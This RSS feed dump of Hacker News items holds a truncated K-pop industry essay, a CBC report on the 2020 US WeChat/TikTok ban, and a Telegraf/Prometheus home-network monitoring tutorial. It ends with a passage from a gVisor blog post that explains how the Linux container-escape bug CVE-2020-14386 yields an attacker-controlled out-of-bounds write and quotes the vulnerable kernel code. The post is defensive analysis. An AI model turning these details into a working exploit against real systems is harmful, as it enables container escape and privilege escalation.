<p>Properly understood, “K-pop music” is inseparable from “K-pop performance.” The music itself is one component of a larger presentation which includes dance choreography, music videos, fashion, and the personas of bands and individual band members. Though these elements are also present in Western music, they are far more important to K-pop music. K-pop fandom is considered the appreciation of all these aspects as an integrated whole.</p>
<h3><strong>What are the Origins of K-pop?</strong></h3>
<p>The Western influence on Korean music began in the 1940s with the American occupation of much of the Korean peninsula after its liberation from Imperial Japan. With the outbreak of the Korean War in the early 1950s, further American presence was added, with over 300,000 US troops at the peak.<a href="#_edn1" name="_ednref1">[1]</a> After the war, the American military stayed at dozens<a href="#_edn2" name="_ednref2">[2]</a> of bases throughout South Korea as a permanent fixture of the country. Over the decades, these soldiers imported American culture and media, including American music. Presently, there are still 20,000 US soldiers in South Korea.<a href="#_edn3" name="_ednref3">[3]</a></p>
<p>The early Western musical influence in South Korea was based on folk and hippie music in the 60s and 70s, and then evolved into sappy ballads in the 80s. These genres merged with traditional Korean music to form a small, localized music industry. Creative expansion was restrained by the South Korean government’s censorship and restrictions on movement in and out of the country. In the 1970s, the government banned American rock music and Korean offshoots for their connotations with drug use.<a href="#_edn4" name="_ednref4">[4]</a> Until 1983, South Korean citizens were banned from traveling abroad for tourism, and the last restrictions weren’t lifted until 1988 (year of the Seoul Summer Olympics).<a href="#_edn5" name="_ednref5">[5]</a></p>
<p>Korean music had a revolution in the early 1990s with the three-member band, Seo Taiji and the Boys. Founded in 1992, the Boys debuted on a South Korean television talent show and received the lowest ratings of the night.<a href="#_edn6" name="_ednref6">[6]</a> Unexpectedly, their premiere song was a huge hit and launched the band to fame. The Boys soon became the first successful Korean rap group and redefined the Korean music industry. Leader Seo Taiji was a rare experimenter in a country still emerging from isolation and relative cultural stagnancy. Prior to forming the Boys, he had been part of an indie heavy metal band.<a href="#_edn7" name="_ednref7">[7]</a></p>
<p>Through their music, style, and appearance, Seo Taiji and the Boys inadvertently became the first K-Pop band. While their music was more hip hop-based, the Boys pioneered the mixture of Western pop and hip hop presented with intense, highly-choreographed dance routines within a refined aesthetic theme.<a href="#_edn8" name="_ednref8">[8]</a> For a sample, see here:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/IRFfPZQeJuo?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Seo Taiji and the Boys disbanded in 1996. But by the end of its short career, mimicking boy bands had sprung up throughout South Korea. These bands were picked up by a new wave of music production companies which would become the basis of the K-pop industry. They looked to Japan and its well established “J-pop” industry as a template for the sustained production of popular musical talent. Thus, while the Boys were independent, experimental, and subversive, the bands created in their wake were more institutionalized, sanitized, and formed by top-down design.</p>
<h3><strong>How Big is K-pop?</strong></h3>
<p>In 2017, the entire K-pop industry produced $5 billion in revenue.<a href="#_edn9" name="_ednref9">[9]</a> For the closest American comparison I can find – in 2019, American <em>record labels</em> earned $8.7 billion in revenue.<a href="#_edn10" name="_ednref10">[10]</a> Unfortunately, I can’t find numbers for total music industry revenue in the US, so this isn’t quite a fair comparison. The two might be difficult to compare due to diverging industry structures;&nbsp; for instance, in South Korea, $1.2 billion of its 2017 revenues came from karaoke sales, only $250 million less than its digital music sales<a href="#_edn11" name="_ednref11">[11]</a></p>
<p>Nevertheless, considering that South Korea has less than 1/6<sup>th</sup> the US population and 1/14<sup>th</sup> the GDP, that’s pretty damn impressive.</p>
<p>Also of note, in 2019, South Korea was the 6<sup>th</sup> largest music market in the world, ahead of China and behind France.<a href="#_edn12" name="_ednref12">[12]</a> In 2017, South Korea exported $513 million worth of music and imported only $14 million worth, which is an extremely strong indicator of the country’s preference for K-pop over Western pop.<a href="#_edn13" name="_ednref13">[13]</a></p>
<p>BTS (AKA Bangtan Boys) is the most popular K-pop band in the world today and ever. According to the 2019 IFPI Global Music Report, BTS was the 7<sup>th</sup> most listened to artist in the world, and had the 3<sup>rd</sup> most popular album globally. Despite Spotify not streaming in South Korea, BTS was its second most popular artist in 2019.<a href="#_edn14" name="_ednref14">[14]</a></p>
<p>Perhaps more relevantly, a 2017 Hyundai Research Institute report claimed that BTS alone was worth $3.6 billion to the South Korean economy annually when accounting for adjacent economic activity and tourism. Supposedly 1/13th of all tourists to South Korea in 2017 came because of BTS.<a href="#_edn15" name="_ednref15">[15]</a> A 2019 report from Hollywood Reporter brought the figure up $4.65 billion.<a href="#_edn16" name="_ednref16">[16]</a></p>
<h3><strong>How Big is K-pop in America?</strong></h3>
<p>I can’t find firm figures, but the general consensus is that K-pop has been blowing up in the US since at least 2017, with articles about the genre’s American explosion popping up in the <em>New York Times</em>,<a href="#_edn17" name="_ednref17">[17]</a> <em>NPR</em>,<a href="#_edn18" name="_ednref18">[18]</a> the <em>Guardian</em>,<a href="#_edn19" name="_ednref19"><em><strong>[19]</strong></em></a> etc. From 2015 to 2019, demand for K-pop concert tickets increased 1,900% in the US.<a href="#_edn20" name="_ednref20">[20]</a> This growth seems to be largely thanks to BTS, which is about 5X more popular than Blackpink, the second most popular …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</a></em></p>]]>
            </description>
            <link>https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525108</guid>
            <pubDate>Sat, 19 Sep 2020 04:36:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 180 (<a href="https://news.ycombinator.com/item?id=24524662">thread link</a>) | @empressplay
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524662</guid>
            <pubDate>Sat, 19 Sep 2020 03:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monitoring My Home Network]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24524433">thread link</a>) | @mr-karan
<br/>
September 18, 2020 | https://mrkaran.dev/posts/isp-monitoring/ | <a href="https://web.archive.org/web/*/https://mrkaran.dev/posts/isp-monitoring/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p>I like monitoring <em>stuff</em>. That’s what I do at work and when my home ISP started giving me random problems and I decided it would be nice to monitor my home network as well. There are a couple of ways to go around this, a very popular and OSS solution is <a href="https://oss.oetiker.ch/smokeping/">SmokePing</a>. SmokePing is written in Perl and is used to visualise network latencies. It’s quite a great solution but for my current stack which involves Prometheus and Grafana, it meant I had to deploy a standalone tool separate from my monitoring stack - something which I wanted to avoid.</p>

<p><img src="https://oss.oetiker.ch/smokeping/doc/reading_detail.png" alt="SmokePing Graphs"></p>

<p>So, I looked for other solutions and luckily happened to stumble upon <a href="https://twitter.com/oddtazz">oddtazz</a> in one of the common Telegram groups where he shared his solution for the above: Telegraf ICMP <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/ping">plugin</a> and Grafana. This is exactly what I’ve been looking for but for some reason, I had wrongly assumed Telegraf needs InfluxDB to store the data. Googling a bit more, I found Telegraf <a href="https://github.com/influxdata/telegraf/blob/release-1.15/plugins/outputs/prometheus_client/README.md">supports</a> Prometheus format (amongst a huge list of others!) but this wasn’t so clear in their docs.</p>

<p>I decided to run a Telegraf agent in my RPi connected to my home router over LAN and scrape metrics using Prometheus and visualise graphs in Grafana! For the non-patient readers, here’s what my dashboard looks like!:</p>

<p><img src="https://mrkaran.dev/images/ISP-Monitoring-Grafana2.png" alt="image"></p>

<p><img src="https://mrkaran.dev/images/ISP-Monitoring-Grafana1.png" alt="image"></p>

<h2 id="setup">Setup</h2>

<p>To get started, we need to download <a href="https://github.com/influxdata/telegraf">Telegraf</a> and configure the <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/ping">Ping</a> plugin. Telegraf has the concept of <strong>Plugins</strong> for Input, Output, Aggregating and Processing. What this basically means is that you can configure multiple input plugins like DNS, ICMP, HTTP and export the data of these plugins in a format of your choice with Output plugins.
This makes Telegraf extermely extensible, you could write a plugin (in Go) of your choice if you fancy that as well!</p>

<p>Here’s what my <code>telegraf.conf</code> looks like:</p>
<div><pre><code data-lang="toml"><span># Input plugins</span>

<span># Ping plugin</span>
[[<span>inputs</span>.<span>ping</span>]]
<span>urls</span> = [<span>"mrkaran.dev"</span>, <span>"tailscale.mrkaran.dev"</span>, <span>"floyd.mrkaran.dev"</span>, <span>"1.1.1.1"</span>, <span>"kite.zerodha.com"</span>, <span>"google.com"</span>, <span>"reddit.com"</span>, <span>"twitter.com"</span>, <span>"amazon.in"</span>, <span>"zerodha.com"</span>]
<span>count</span> = <span>4</span>
<span>ping_interval</span> = <span>1.0</span>
<span>timeout</span> = <span>2.0</span>

<span># DNS plugin</span>
[[<span>inputs</span>.<span>dns_query</span>]]
  <span>servers</span> = [<span>"100.101.134.59"</span>]
  <span>domains</span> = [<span>"mrkaran.dev"</span>, <span>"tailscale.mrkaran.dev"</span>, <span>"floyd.mrkaran.dev"</span>, <span>"1.1.1.1"</span>, <span>"kite.zerodha.com"</span>, <span>"google.com"</span>, <span>"reddit.com"</span>, <span>"twitter.com"</span>, <span>"amazon.in"</span>, <span>"zerodha.com"</span>]

<span># Output format plugins</span>
[[<span>outputs</span>.<span>prometheus_client</span>]]
  <span>listen</span> = <span>":9283"</span>
  <span>metric_version</span> = <span>2</span></code></pre></div>
<p>Firstly, so nice to see an <em>Ops</em> tool <strong>not</strong> using <code>YAML</code>. Kudos to Telegraf for that. I’d love to see other tools follow suit.</p>

<p>Getting back to the configuration part, <code>input.plugin</code> is a list of plugins that can be configured and I have configured the Ping and DNS plugin in my config. The <code>output</code> is in Prometheus format so it can be scraped and ingested by Prometheus’ time-series DB.</p>

<h3 id="running-telegraf">Running Telegraf</h3>

<p>With the above config in place, let’s try running the agent and see what metrics we get. I am using <a href="https://hub.docker.com/_/telegraf/">official</a> Docker image to run the agent with the following config:</p>
<div><pre><code data-lang="sh">docker run --name telegraf-agent --restart always -d -p <span>9283</span>:9283 -v <span>$PWD</span>/telegraf.conf:/etc/telegraf/telegraf.conf:ro telegraf</code></pre></div>
<p>After running the above command, you should be able to see the metrics at <code>localhost:9283/metrics</code></p>
<div><pre><code data-lang="sh">$ curl localhost:9283/metrics | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  <span>0</span>     <span>0</span>    <span>0</span>     <span>0</span>    <span>0</span>     <span>0</span>      <span>0</span>      <span>0</span> --:--:-- --:--:-- --:--:--     <span>0</span><span># HELP dns_query_query_time_ms Telegraf collected metric</span>
<span># TYPE dns_query_query_time_ms untyped</span>
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"amazon.in"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>124</span>.096472
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"google.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>136</span>.793673
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"kite.zerodha.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>122</span>.780946
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"mrkaran.dev"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>137</span>.915851
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"twitter.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>111</span>.097483</code></pre></div>
<p>Perfect! Now, we’re all set to configure Prometheus to scrape the metrics from this target. In order to do that you need to add a new <a href="https://prometheus.io/docs/concepts/jobs_instances/">Job</a>:</p>
<div><pre><code data-lang="yml">- job_name: <span>"ispmonitor"</span>
  scrape_interval: 60s
  static_configs:
    - targets: [<span>"100.94.241.54:9283"</span>] <span># RPi telegraf Agent</span></code></pre></div>
<p>In the above config, I am plugging my Tailscale IP assigned to my RPi on the port where Telegraf agent is bound to. This is one of the <strong>many</strong> reasons why Tailscale is so bloody awesome! I can connect different components in my network to each other without setting up any particular firewall rules, exposing ports on a case by case basis.</p>

<p><strong>Sidenote</strong>: If you haven’t read Tailscale’s <strong>amazing</strong> <a href="https://tailscale.com/blog/how-nat-traversal-works/">NAT Traversal blog post</a>, do yourself a favour and check it out after you finish reading this one ofcourse!</p>

<p>Anyway, coming back to our Prometheus setup, we can see the metrics being ingested:</p>

<p><img src="https://mrkaran.dev/images/Prometheus-Telegraf-Ingest.png" alt="image"></p>

<h2 id="show-me-the-graphs">Show me the graphs</h2>

<p>Now comes the exciting bit – making <strong>pretty</strong> graphs. First, let’s discuss what’s the most important data I can extract out of <code>Ping</code> and <code>DNS</code> plugins. These plugins export decent amount of data, but a good rule of thumb while making dashboards is to optimise signal v/s noise ratio. We’ll do that by filtering out only the metrics that we care for.</p>

<p>Let’s checkout all the metrics exported by <code>Ping</code> plugin:</p>
<div><pre><code data-lang="sh">$ curl localhost:9283/metrics | grep ping | grep TYPE
<span># TYPE ping_average_response_ms untyped</span>
<span># TYPE ping_maximum_response_ms untyped</span>
<span># TYPE ping_minimum_response_ms untyped</span>
<span># TYPE ping_packets_received untyped</span>
<span># TYPE ping_packets_transmitted untyped</span>
<span># TYPE ping_percent_packet_loss untyped</span>
<span># TYPE ping_result_code untyped</span>
<span># TYPE ping_standard_deviation_ms untyped</span>
<span># TYPE ping_ttl untyped</span></code></pre></div>
<p>Perfect! So, from the above list of metrics, the most important ones for us are:</p>

<ul>
<li><code>ping_average_response_ms</code>: Avg RTT for a packet</li>
<li><code>ping_maximum_response_ms</code>: Max RTT for a packet</li>
<li><code>ping_percent_packet_loss</code>: % of packets lost on the way</li>
</ul>

<p>With just the above 3 metrics, we can answer questions like:</p>

<ul>
<li><strong>Is my ISP suffering an outage?</strong></li>
</ul>

<p>If yes, <code>ping_percent_packet_loss</code> should be unusually higher than normal. This usually happens when the ISP has routing is borked and that causes the packet to be routed in a less optimized way and as a side effect packet loss becomes one of the key metrics to measure here.</p>

<ul>
<li><strong>Is the upstream down?</strong></li>
</ul>

<p>If yes, <code>ping_average_response_ms</code> over a recent window should be higher than a window compared to a previous time range when things were fine and dandy. This can either mean 2 things: Either your ISP isn’t routing correctly to the said upstream or the CDN/Region where your upstream is faced an outage. This is quite a handy metric for me to monitor!</p>

<p>How many times have your friends complained “<code>xyz.com</code> isn’t working for me” and when you try to load, it’s fine from your end? There are a lot of actors at play but <code>ping</code> is usually the most simple and quickest way to detect whether an issue persists or not. Of course, this doesn’t work for hosts which block ICMP packets altogether. They are not rare either, like <code>netflix.com</code> and <code>github.com</code> both block ICMP probes for example. For my use case, this wasn’t a major issue as I was able to still probe a decent amount of upstreams all over the world.</p>

<p>With that out of the way, let’s break the dashboard into different components and see what goes behind them.</p>

<h3 id="ping-response-panel">Ping Response Panel</h3>

<p><img src="https://mrkaran.dev/images/ping-row-panel3.png" alt=""></p>

<p>To plot this, simply choose a <code>Stat</code> visualisation with the query <code>ping_average_response_ms{url="$url"}</code>. Repeat this panel for the variable <code>$url</code> and you should be able to generate a nice row view like this.</p>

<p>Additonally you can choose Thresholds and the Unit to be displayed in the panel with these options.</p>

<p><img src="https://mrkaran.dev/images/ping-row-panel1.png" alt="">
<img src="https://mrkaran.dev/images/ping-row-panel2.png" alt=""></p>

<h3 id="ping-response-time-graph">Ping Response Time Graph</h3>

<p>The next graph is interesting, it lets me visualise the avg, min, max ping response time as well as the % packet loss plotted on the Y2 (right Y) axis.</p>

<p><img src="https://mrkaran.dev/images/floyd-ping.png" alt=""></p>

<h3 id="availability-panel">Availability Panel</h3>

<p>An interesting query to calculate uptime (just in the context whether the upstream is reachable) is:</p>
<div><pre>100 - avg_over_time(ping_percent_packet_loss[2m])</pre></div>
<p>Since I scrape metrics at an interval of <code>1m</code>(in order to not ping too frequently and disrupt my actual browsing experience), in this query I am averaging the data points for the metric <code>ping_percent_packet_loss</code> in a <code>[2m]</code> window.</p>

<p><img src="https://mrkaran.dev/images/ping-availability.png" alt=""></p>

<h3 id="dns-response-time-graph">DNS Response Time Graph</h3>

<p>We can similarly query the DNS response time by visualising the average response time for a DNS query. This might be useful only to people self-hosting their DNS servers.</p>

<p><img src="https://mrkaran.dev/images/telegraf-dns.png" alt=""></p>

<h2 id="conclusion">Conclusion</h2>

<p>So with a pretty simple and minimal OSS solution, I was able to setup monitoring for my home network! Over the last few days whenever my ISP had slightest of trouble, I can correlate it with my metrics! I mean I still can’t do anything about it cause the other person on ISP’s customer support is “Did you try rebooting your router”  – the quintessential solution to all tech problems. Wish we could reboot this entire damn 2020 as well, but one could hope!</p>

<p>If you enjoyed reading this please share it in your circle! Shoot me for any questions on my Twitter <a href="https://twitter.com/mrkaran_">@mrkaran_</a> :)</p>

<p>Fin!</p>

			</div></div>]]>
            </description>
            <link>https://mrkaran.dev/posts/isp-monitoring/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524433</guid>
            <pubDate>Sat, 19 Sep 2020 02:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Containing a Real Vulnerability]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24524408">thread link</a>) | @iou
<br/>
September 18, 2020 | https://gvisor.dev/blog/2020/09/18/containing-a-real-vulnerability | <a href="https://web.archive.org/web/*/https://gvisor.dev/blog/2020/09/18/containing-a-real-vulnerability">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p>In the previous two posts we talked about gVisor’s
<a href="https://gvisor.dev/blog/2019/11/18/gvisor-security-basics-part-1/">security design principles</a>
as well as how those are applied in the
<a href="https://gvisor.dev/blog/2020/04/02/gvisor-networking-security/">context of networking</a>.
Recently, a new container escape vulnerability
(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14386">CVE-2020-14386</a>)
was announced that ties these topics well together. gVisor is
<a href="https://seclists.org/oss-sec/2020/q3/168">not vulnerable</a> to this specific
issue, but it provides an interesting case study to continue our exploration of
gVisor’s security. While gVisor is not immune to vulnerabilities,
<a href="https://gvisor.dev/security/">we take several steps</a> to minimize the impact and
remediate if a vulnerability is found.</p>

<h2 id="escaping-the-container">Escaping the Container</h2>

<p>First, let’s describe how the discovered vulnerability works. There are numerous
ways one can send and receive bytes over the network with Linux. One of the most
performant ways is to use a ring buffer, which is a memory region shared by the
application and the kernel. These rings are created by calling
<a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> with
<a href="https://man7.org/linux/man-pages/man7/packet.7.html"><code>PACKET_RX_RING</code></a> for
receiving and
<a href="https://man7.org/linux/man-pages/man7/packet.7.html"><code>PACKET_TX_RING</code></a> for
sending packets.</p>

<p>The vulnerability is in the code that reads packets when <code>PACKET_RX_RING</code> is
enabled. There is another option
(<a href="https://man7.org/linux/man-pages/man7/packet.7.html"><code>PACKET_RESERVE</code></a>) that
asks the kernel to leave some space in the ring buffer before each packet for
anything the application needs, e.g. control structures. When a packet is
received, the kernel calculates where to copy the packet to, taking the amount
reserved before each packet into consideration. If the amount reserved is large,
the kernel performed an incorrect calculation which could cause an overflow
leading to an out-of-bounds write of up to 10 bytes, controlled by the attacker.
The data in the write is easily controlled using the loopback to send a crafted
packet and receiving it using a <code>PACKET_RX_RING</code> with a carefully selected
<code>PACKET_RESERVE</code> size.</p>

<div><div><pre><code><span>static</span> <span>int</span> <span>tpacket_rcv</span><span>(</span><span>struct</span> <span>sk_buff</span> <span>*</span><span>skb</span><span>,</span> <span>struct</span> <span>net_device</span> <span>*</span><span>dev</span><span>,</span>
               <span>struct</span> <span>packet_type</span> <span>*</span><span>pt</span><span>,</span> <span>struct</span> <span>net_device</span> <span>*</span><span>orig_dev</span><span>)</span>
<span>{</span>
<span>// ...</span>
    <span>if</span> <span>(</span><span>sk</span><span>-&gt;</span><span>sk_type</span> <span>==</span> <span>SOCK_DGRAM</span><span>)</span> <span>{</span>
        <span>macoff</span> <span>=</span> <span>netoff</span> <span>=</span> <span>TPACKET_ALIGN</span><span>(</span><span>po</span><span>-&gt;</span><span>tp_hdrlen</span><span>)</span> <span>+</span> <span>16</span> <span>+</span>
                  <span>po</span><span>-&gt;</span><span>tp_reserve</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>unsigned</span> <span>int</span> <span>maclen</span> <span>=</span> <span>skb_network_offset</span><span>(</span><span>skb</span><span>);</span>
        <span>// tp_reserve is unsigned int, netoff is unsigned short. Addition can overflow netoff</span>
